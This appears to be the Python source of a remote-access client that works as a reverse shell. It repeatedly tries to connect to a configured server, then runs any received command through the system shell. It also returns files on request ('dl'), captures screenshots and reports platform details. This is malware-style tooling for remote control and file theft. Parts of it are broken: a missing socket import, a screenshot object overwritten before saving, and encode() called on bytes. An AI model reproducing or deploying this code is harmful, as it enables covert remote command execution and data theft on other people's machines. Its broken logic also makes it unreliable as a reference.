import subprocess

# Check and install required libraries
def install_required_libraries():
    libraries = ["PIL"]
    for lib in libraries:
        try:
            __import__(lib)
        except ImportError:
            print(f"Installing {lib}...")
            subprocess.run(["pip", "install", lib])

install_required_libraries()

import time
import subprocess
import platform
import os
from PIL import ImageGrab
import datetime


HOST_IP = "127.0.0.1"
PORT = 3200
MAX_DATA_SIZE = 1024


print(f"connection server , IP :{HOST_IP} , PORT: {PORT}")
while True:
    try :
        # Create a socket object
        s = socket.socket()
        s.connect((HOST_IP,PORT))
    except: 
        print("ERROR : Connection unsuccesfull")
        time.sleep(4)
    else:
        print("Connected to the server")
        break;

while True:
    command_data = s.recv(MAX_DATA_SIZE)
    if not command_data: 
        break
    command = command_data.decode("utf-8")
    print("Command: " ,command) 
    command_split = command.split(" ")

    if command == "info":
        response= platform.platform() + " "+ os.getcwd()
        response = response.encode()
    elif len(command_split) == 2  and command_split[0] == "cd":
        try:
            os.chdir(command_split[1].strip("'"))
            response = " "
        except FileNotFoundError :
            response= "Error: folder do not exist or is missing"
        response = response.encode()
    elif len(command_split) == 2  and command_split[0] == "dl":
        try:
            f= open(command_split[1],"rb")
        except FileNotFoundError :
            response = " ".encode()
        else :
            response=f.read()
            f.close()
    elif len(command_split) == 2  and command_split[0] == "screenshot":
        screenshot = ImageGrab.grab()
        now = datetime.datetime.now()
        date_string = now.strftime('%Y-%m-%d_%H-%M-%S')
        screenshot = f"{command_split[1]}_{date_string}.png"        
        screenshot.save(screenshot ,'PNG')
        try:
          f= open(command_split[1],"rb")
        except FileNotFoundError :
            response = " ".encode()
        else :
            response=f.read()
            f.close()


    else :
        result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)   
        response= result.stdout + result.stderr

        if not response or len(response) == 0:
            response =" "
        response = response.encode("utf-8")

    data_len = len(response)  
    header = str(len(response.encode())).zfill(13)
    print("data length: ", header)
    s.sendall(header.encode("utf-8"))
    if  data_len >0 :
        s.sendall(response)


s.close()